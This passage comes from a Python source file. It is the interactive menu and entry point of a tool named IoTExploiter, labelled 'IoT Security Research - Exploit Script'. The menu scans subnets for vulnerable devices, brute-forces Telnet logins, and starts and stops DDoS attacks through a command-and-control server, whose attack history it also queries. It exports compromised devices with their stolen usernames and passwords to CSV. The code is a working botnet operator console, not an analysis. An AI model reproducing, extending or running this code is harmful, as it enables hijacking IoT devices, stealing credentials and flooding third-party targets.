            print("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—")
            print("â•‘              Available Actions                     â•‘")
            print("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
            print("1. ğŸ” Scan network for vulnerable devices")
            print("2. ğŸ”‘ Brute-force Telnet credentials")
            print("3. ğŸš€ Start Telnet DDoS attack (via C2)")
            print("4. ğŸ›‘ Stop Telnet DDoS attack (via C2)")
            print("5. ğŸ’¾ Save results to disk")
            print("6. ğŸ”„ Refresh status")
            print("7. ğŸ“Š View attack history (via C2)")
            print("8. ğŸ”§ Advanced options")
            print("9. ğŸšª Exit")

            choice = input("\nEnter your choice (1-9): ").strip()

            if choice == "1":
                subnet = input("\nEnter target subnet (default: current setting): ").strip()
                if subnet:
                    self.subnet = subnet
                
                print(f"\nğŸ” Scanning network {self.subnet}...")
                self.scan_network()
                print("\nâœ… Scan completed!")

            elif choice == "2":
                if not self.scan_results:
                    print("âŒ No scan results available. Please run a scan first.")
                else:
                    custom_creds = input("\nDo you want to use custom credentials? (y/n, default: n): ").strip().lower()
                    if custom_creds == 'y':
                        custom_username = input("Enter username: ").strip()
                        custom_password = input("Enter password: ").strip()
                        if custom_username or custom_password:
                            # Add to beginning of credentials list
                            self.credentials.insert(0, (custom_username, custom_password))
                            print(f"Added '{custom_username}':'{custom_password}' to credentials list")
                    
                    max_attempts = input("Enter maximum login attempts per device (default: all): ").strip()
                    if max_attempts and max_attempts.isdigit():
                        max_attempts = int(max_attempts)
                        print(f"Will try up to {max_attempts} credential pairs per device")
                    else:
                        max_attempts = len(self.credentials)
                        print(f"Will try all {max_attempts} credential pairs per device")
                    
                    self.brute_force_telnet()

            elif choice == "3":
                if not c2_connected:
                    print("âŒ Cannot connect to C2 server. Check connection and try again.")
                else:
                    self.start_ddos_via_c2()

            elif choice == "4":
                if not c2_connected:
                    print("âŒ Cannot connect to C2 server. Check connection and try again.")
                else:
                    self.stop_ddos_via_c2()

            elif choice == "5":
                filename = input("\nEnter custom filename prefix (default: results): ").strip()
                if not filename:
                    filename = "results"
                
                self.save_results(filename)
                print(f"âœ… Results saved with prefix '{filename}'")

            elif choice == "6":
                print("ğŸ”„ Refreshing status...")
                continue
                
            elif choice == "7":
                if not c2_connected:
                    print("âŒ Cannot connect to C2 server. Check connection and try again.")
                else:
                    try:
                        response = requests.get(f"{self.cnc_url}/get-attack-history", timeout=10)
                        if response.status_code == 200:
                            attacks = response.json()
                            if attacks:
                                print("\nğŸ“Š Attack History:")
                                for attack in attacks:
                                    attack_time = attack.get('start_time', 'Unknown')
                                    attack_type = attack.get('attack_type', 'Unknown')
                                    target = attack.get('target', 'Unknown')
                                    status = attack.get('status', 'Unknown')
                                    devices = attack.get('participating_bots', 0)
                                    
                                    print(f"  â€¢ {attack_time}: {attack_type} attack on {target}")
                                    print(f"    Status: {status}, Devices: {devices}")
                            else:
                                print("No attack history available")
                        else:
                            print(f"âŒ Failed to retrieve attack history. Status: {response.status_code}")
                    except Exception as e:
                        print(f"âŒ Error retrieving attack history: {e}")

            elif choice == "8":
                print("\nğŸ”§ Advanced Options:")
                print("1. Change C2 server address")
                print("2. View credentials list")
                print("3. Test device connectivity")
                print("4. Export compromised devices as CSV")
                print("5. Explain 'Not registered with C2' status")
                print("6. Back to main menu")
                
                advanced_choice = input("Enter choice (1-6): ").strip()
                
                if advanced_choice == "1":
                    new_cnc = input(f"Enter new C2 server IP (current: {self.cnc_server_ip}): ").strip()
                    if new_cnc:
                        self.cnc_server_ip = new_cnc
                        self.cnc_url = f"http://{new_cnc}:5000"
                        print(f"âœ… C2 server address updated to {new_cnc}")
                
                elif advanced_choice == "2":
                    print("\nCredentials List:")
                    for i, (username, password) in enumerate(self.credentials, 1):
                        print(f"{i}. '{username}':'{password}'")
                
                elif advanced_choice == "3":
                    if not self.compromised_devices:
                        print("âŒ No compromised devices to test")
                    else:
                        print("\nTesting device connectivity...")
                        for device in self.compromised_devices:
                            ip = device['ip']
                            try:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.settimeout(2)
                                s.connect((ip, 23))
                                s.close()
                                print(f"âœ… {ip} is reachable on port 23")
                                # Update status
                                device['status'] = 'online'
                            except:
                                print(f"âŒ {ip} is not reachable on port 23")
                                device['status'] = 'offline'
                
                elif advanced_choice == "4":
                    if not self.compromised_devices:
                        print("âŒ No compromised devices to export")
                    else:
                        filename = input("Enter CSV filename (default: compromised_devices.csv): ").strip()
                        if not filename:
                            filename = "compromised_devices.csv"
                        
                        try:
                            with open(filename, 'w') as f:
                                f.write("IP,Username,Password,Status,Registered_C2\n")
                                for device in self.compromised_devices:
                                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
                            print(f"âœ… Exported {len(self.compromised_devices)} devices to {filename}")
                        except Exception as e:
                            print(f"âŒ Error exporting to CSV: {e}")
                
                elif advanced_choice == "5":
                    self.explain_registration_status()
                
                elif advanced_choice == "6":
                    continue
                
                else:
                    print("Invalid choice")

            elif choice == "9":
                confirm = input("Are you sure you want to exit? (y/n): ").strip().lower()
                if confirm == 'y':
                    print("Exiting...")
                    break
                else:
                    continue

            else:
                print("âŒ Invalid choice. Please try again.")

            input("\nPress Enter to continue...")
    
def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='IoT Security Research - Exploit Script')
    parser.add_argument('--cnc', required=True, help='C&C server IP address')
    parser.add_argument('--subnet', help='Target subnet (default: 11.10.10.0/24)')
    args = parser.parse_args()

    # Test connectivity to C&C server
    cnc_ip = args.cnc
    print(f"Checking connectivity to C&C server at {cnc_ip}...")
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    
    try:
        result = subprocess.run(['ping', param, '1', cnc_ip], 
                               stdout=subprocess.PIPE, 
                               stderr=subprocess.PIPE, 
                               text=True, 
                               timeout=10)
        output = result.stdout.lower()
        
        if 'ttl=' in output or 'bytes from' in output:
            print(f"âœ“ C&C server {cnc_ip} is reachable")
        else:
            print(f"âœ— Cannot reach C&C server at {cnc_ip}")
            exit(1)
            
    except Exception as e:
        print(f"âœ— Error testing connectivity to C&C server: {e}")
        exit(1)

    exploiter = IoTExploiter(args.cnc, args.subnet)
    exploiter.interactive_menu()

if __name__ == "__main__":
    main()